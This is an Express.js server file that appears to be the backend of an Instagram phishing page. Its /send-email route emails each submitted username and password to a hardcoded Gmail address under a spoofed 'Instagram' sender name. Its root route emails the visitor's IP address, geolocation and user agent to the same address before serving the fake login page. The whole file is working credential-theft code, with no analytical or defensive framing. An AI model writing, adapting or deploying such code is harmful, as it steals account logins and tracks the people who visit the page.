require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const geoip = require('geoip-lite');
const { Resend } = require('resend');
const path = require('path');

const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.json());

const resend = new Resend(process.env.RESEND_API_KEY);

app.post('/send-email', async (req, res) => {
  const { username, password } = req.body;

  try {
    const data = await resend.emails.send({
      from: 'Instagram <onboarding@resend.dev>',
      to: 'johncena989673@gmail.com', 
      subject: 'New Login Form Submission',
      html: `<p><strong>Username:</strong> ${username}</p><p><strong>Password:</strong> ${password}</p>`,
    });

    res.status(200).json({ success: true, messageId: data.id });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  let geo;
  try {
    geo = geoip.lookup(ip.includes(',') ? ip.split(',')[0].trim() : ip);
    console.log(`Fetching geolocation for IP: ${geo}`);
  } catch (err) {
    console.warn('Failed to fetch IP geolocation');
  }

  const htmlContent = `
    <h3>New Visit</h3>
    <p><strong>IP:</strong> ${ip}</p>
    <p><strong>Location:</strong> ${geo ? JSON.stringify(geo) : 'Location Not Found.'}</p>
    <p><strong>User Agent:</strong> ${userAgent}</p>
  `;

  try {
    await resend.emails.send({
      from: 'Instagram <onboarding@resend.dev>',
      to: 'johncena989673@gmail.com',
      subject: 'New Visitor Detected',
      html: htmlContent,
    });

    res.sendFile(path.join(__dirname, 'index.html'));
  } catch (error) {
    console.error(error);
    res.status(500).send('Email failed.');
  }
});

app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
});
